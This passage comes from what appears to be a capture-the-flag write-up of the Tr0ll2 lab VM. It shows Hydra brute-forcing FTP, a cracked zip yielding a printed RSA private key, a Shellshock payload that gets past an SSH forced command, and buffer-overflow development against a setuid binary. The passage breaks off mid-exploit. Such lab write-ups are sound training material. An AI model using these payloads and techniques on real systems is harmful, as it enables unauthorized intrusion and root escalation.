</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll_again.jpg&quot;</span> - 10623 of 13689 <span class="o">[</span>child 23<span class="o">]</span>
</span><span class='line'><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 192.168.56.101   login: Tr0ll   password: Tr0ll
</span><span class='line'><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for </span>192.168.56.101 <span class="o">(</span>valid pair found<span class="o">)</span>
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2014-10-10 08:29:08
</span></code></pre></td></tr></table></div></figure>


<p>After a really, really long time, we finally get a successful combination of <code>Tr0ll:Tr0ll</code>. Guess I could have guessed that but oh well. Lets see if this gives us any access:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ftp 192.168.56.101
</span><span class='line'>Connected to 192.168.56.101.
</span><span class='line'>220 Welcome to Tr0ll FTP... Only noobs stay <span class="k">for </span>a <span class="k">while</span>...
</span><span class='line'>Name <span class="o">(</span>192.168.56.101:root<span class="o">)</span>: Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span></code></pre></td></tr></table></div></figure>


<p>Yay! Progress! Lets take a closer look&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; pas
</span><span class='line'>Passive mode on.
</span><span class='line'>
</span><span class='line'>ftp&gt; ls
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,73,4<span class="o">)</span>
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>
</span><span class='line'>ftp&gt; get lmao.zip
</span><span class='line'><span class="nb">local</span>: lmao.zip remote: lmao.zip
</span><span class='line'>227 Entering Passive Mode <span class="o">(</span>192,168,56,101,105,73<span class="o">)</span>
</span><span class='line'>150 Opening BINARY mode data connection <span class="k">for </span>lmao.zip <span class="o">(</span>1474 bytes<span class="o">)</span>.
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs <span class="o">(</span>621.0 kB/s<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>ftp&gt; bye
</span><span class='line'>221 Goodbye.
</span></code></pre></td></tr></table></div></figure>


<h1>noob key</h1>

<p>We find ourselves with a zip archive called <code>lmao.zip</code>. A encrypted one :(</p>

<p>I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of <code>answer.txt</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# unzip lmao.zip
</span><span class='line'>Archive:  lmao.zip
</span><span class='line'><span class="o">[</span>lmao.zip<span class="o">]</span> noob password: <span class="c">#ItCantReallyBeThisEasyRightLOL</span>
</span><span class='line'>  inflating: noob
</span><span class='line'>
</span><span class='line'>root@kali:~# cat noob
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
</span><span class='line'>yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
</span><span class='line'>/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
</span><span class='line'>q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
</span><span class='line'>z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
</span><span class='line'>e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
</span><span class='line'>u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
</span><span class='line'>gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
</span><span class='line'>UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
</span><span class='line'>La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
</span><span class='line'>xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
</span><span class='line'>aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
</span><span class='line'>K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
</span><span class='line'>n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
</span><span class='line'>TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
</span><span class='line'>WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
</span><span class='line'>ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
</span><span class='line'>0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
</span><span class='line'>vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
</span><span class='line'>ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
</span><span class='line'>th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
</span><span class='line'>G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
</span><span class='line'>q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
</span><span class='line'>vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
</span><span class='line'><span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>A unencrypted private key! Called <code>noob</code>. I guessed <code>noob</code> may be the username, so I fixed up the permissions on the key and tried my luck:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# chmod 600 noob
</span><span class='line'>root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<h2>shocking isn&rsquo;t it</h2>

<p>Surprise surprise. It seemed like we are in fact authenticating, but we don&rsquo;t have a shell. I figured one of two things could be happening here. First, the <code>.bashrc</code> may have been modified with something that echoes the text <code>TRY HARDER LOL!</code> and exits, or there is some restriction on the SSH key for <code>noob</code>.</p>

<p>My first attempts were to specify a command with <code>-t</code> as <code>/bin/bash</code>, but this did not work.</p>

<p>With the current buzz around the recently disclosed <em>shellshock</em> bug, I thought I&rsquo;d try it assuming its a key restriction:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh noob@192.168.56.101 -i noob -t <span class="s1">&#39;() { :;}; /bin/bash&#39;</span>
</span><span class='line'>noob@Tr0ll2:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Shocking :) To confirm, the <code>authorized_keys</code> file has the entry <code>command="echo TRY HARDER LOL!"</code> before the public key.</p>

<h2>which door leads to r00t</h2>

<p>With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory <code>/nothing_to_see_here</code>.</p>

<p><code>/nothing_to_see_here</code> had another directory inside of it <code>choose_wisely/</code> with another 3 sub directories called <code>door1</code>, <code>door2</code> and <code>door3</code>.</p>

<p>All 3 &lsquo;doors&rsquo; had a setuid binary called <code>r00t</code>. I ran the first one which had the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1<span class="nv">$ </span>./r00t
</span><span class='line'>Good job, stand by, executing root shell...
</span><span class='line'>BUHAHAHA NOOB!
</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3<span class="nv">$ </span>
</span><span class='line'>Broadcast message from noob@Tr0ll2
</span><span class='line'>    <span class="o">(</span>/dev/pts/0<span class="o">)</span> at 0:48 ...
</span><span class='line'>
</span><span class='line'>The system is going down <span class="k">for </span>reboot NOW!
</span><span class='line'>Connection to 192.168.56.101 closed by remote host.
</span><span class='line'>Connection to 192.168.56.101 closed.
</span></code></pre></td></tr></table></div></figure>


<p>Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D</p>

<p>The machine rebooted and I logged in again as <code>noob</code>, changing directories to the <code>r00t</code> binaries. I tried to run <code>strings</code> on them, but it seems like the command was unavailable. No worries, next on the list was <code>od</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely<span class="nv">$ </span>od -S 1 door3/r00t
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>0001214 __libc_start_main
</span><span class='line'>0001236 GLIBC_2.0
</span><span class='line'>0001320 R
</span><span class='line'>0001453 Q
</span><span class='line'>0001521 %
</span><span class='line'>0001526 h
</span><span class='line'>0001626 h
</span><span class='line'>0001646 h<span class="o">(</span>
</span><span class='line'>0002066 t<span class="p">&amp;</span>
</span><span class='line'>0002073 <span class="err">&#39;</span>
</span><span class='line'>0002305 i
</span><span class='line'>0002620 Good job, stand by, executing root shell...
</span><span class='line'>0002674 BUHAHAHA NOOB!
</span><span class='line'>0002713 /sbin/reboot
</span><span class='line'>0002733 <span class="p">;</span>0
</span><span class='line'>0002750 L
</span><span class='line'>0002760 p
</span><span class='line'>0003025 zR
</span><span class='line'>0003044
</span><span class='line'>0003060 p
</span><span class='line'>0003077 x
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So this is the binary that simply rebooted the machine. What is weird though is that this <code>r00t</code> binary was in <code>door1/</code> prior to the reboot. I continued to check out the other binaries, when suddenly the folder containing all of the files disappeared and reappeared. After this all of the <code>r00t</code> binaries were shuffled around again.</p>

<p>This was only a minor annoyance and I had enough time to check out the binaries using <code>od</code> to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.</p>

<h2>bof bof bof your boat&hellip;</h2>

<p>I copied the binary of interest to <code>/tmp</code> so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.</p>

<p>With the binary in <code>/tmp</code>, <code>noob</code> was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.</p>

<p>To check the security applied to the binary at compile time, I copied it off using <code>xxd</code> to my local machine and checked it out.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./r00t
</span><span class='line'>Reading symbols from /root/Desktop/troll2/r00t...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partia
</span></code></pre></td></tr></table></div></figure>


<p>No security? EZ PEZE.</p>

<p>Next, it was time to start fuzzing the binary and see if it has any interesting behavior:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>./r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>500 &ldquo;A&rdquo;&rsquo;s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>ldd ./r00t
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xb7e4e000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x80000000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Both entries returned the same address for libc, indicating that ASLR was not enabled :)
Tr0ll2 was also nice enough to include <code>gdb</code>, making the exploit development process very easy.</p>

<h2>the exploit</h2>

<p>With all of the information gathered so far about this particularly interesting <code>r00t</code> binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.</p>

<p>First, we have to inspect the crash when we send those 500 A&rsquo;s</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; * 500&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x41414141: Cannot access memory at address 0x41414141
</span></code></pre></td></tr></table></div></figure>


<p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>

<p>Lets generate the pattern.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# locate pattern_create
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_create.rb
</span><span class='line'>
</span><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 500
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span></code></pre></td></tr></table></div></figure>


<p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
</span><span class='line'>Starting program: /tmp/r00t <span class="s2">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? <span class="o">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 268
</span></code></pre></td></tr></table></div></figure>


<p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
</span><span class='line'>Starting program: /tmp/r00t <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot; *268 + &quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x <span class="nv">$eip</span>
</span><span class='line'>0x42424242: Cannot access memory at address 0x42424242
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>

<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>noob@Tr0ll2:/tmp<span class="nv">$ </span>gdb -q ./r00t
</span><span class='line'>Reading symbols from /tmp/r00t...done.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># here we break on the main function</span>
</span><span class='line'>Breakpoint 1 at 0x8048444: file bof.c, line 3.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># here we run the application....</span>
</span><span class='line'>Starting program: /tmp/r00t
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span>1, <span class="nv">argv</span><span class="o">=</span>0xbffffd84<span class="o">)</span> at bof.c:3
</span><span class='line'>3   bof.c: No such file or directory.
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># and leak the locatin of system() in memory</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e6b060 &lt;system&gt;
